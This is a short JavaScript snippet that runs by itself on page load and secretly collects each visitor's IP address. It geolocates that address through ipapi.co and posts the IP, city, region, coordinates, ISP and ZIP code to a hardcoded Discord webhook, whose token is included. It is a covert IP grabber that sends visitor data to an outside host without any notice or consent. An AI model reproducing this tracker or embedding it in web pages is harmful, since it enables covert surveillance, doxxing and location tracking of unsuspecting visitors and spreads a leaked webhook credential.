function sendIPToWebhook() {
    const webhookURL = 'https://discord.com/api/webhooks/1132405889396129819/g8O3i4yyJFmYcrh9tmH3X9UXpRPvPn5BUbjDrJ0nsctfu3uWMf_6gXermzfhqR_KpnWW'; // Replace with your actual Discord webhook URL
    const ipstackAPIKey = 'YOUR_IPSTACK_API_KEY'; // Replace with your actual ipstack API key

    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            const ipAddress = data.ip;
            fetch(`https://ipapi.co/${ipAddress}/json/`)
                .then(response => response.json())
                .then(geoData => {
                    const embedData = {
                        "title": "User's Geolocation Information",
                        "description": "Here's the geolocation information of the user:",
                        "color": 16776960, // Yellow color (decimal representation)
                        "fields": [
                            {
                                "name": "IP Address",
                                "value": geoData.ip
                            },
                            {
                                "name": "Country",
                                "value": geoData.country_name
                            },
                            {
                                "name": "Region",
                                "value": geoData.region
                            },
                            {
                                "name": "City",
                                "value": geoData.city
                            },
                            {
                                "name": "Latitude",
                                "value": geoData.latitude
                            },
                            {
                                "name": "Longitude",
                                "value": geoData.longitude
                            },
                            {
                                "name": "ISP",
                                "value": geoData.org
                            },
                            {
                                "name": "Organization",
                                "value": geoData.asn
                            },
                            {
                                "name": "ZIP Code",
                                "value": geoData.postal
                            }
                        ]
                    };

                    fetch(webhookURL, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            embeds: [embedData]
                        }),
                    })
                    .then(response => {
                        if (response.ok) {
                            console.log("Geolocation embed sent successfully!");
                        } else {
                            console.error("Failed to send geolocation embed.");
                        }
                    })
                    .catch(error => console.error(error));
                })
                .catch(error => console.error(error));
        })
        .catch(error => console.error(error));
}

// Automatically send the webhook on page load
sendIPToWebhook();
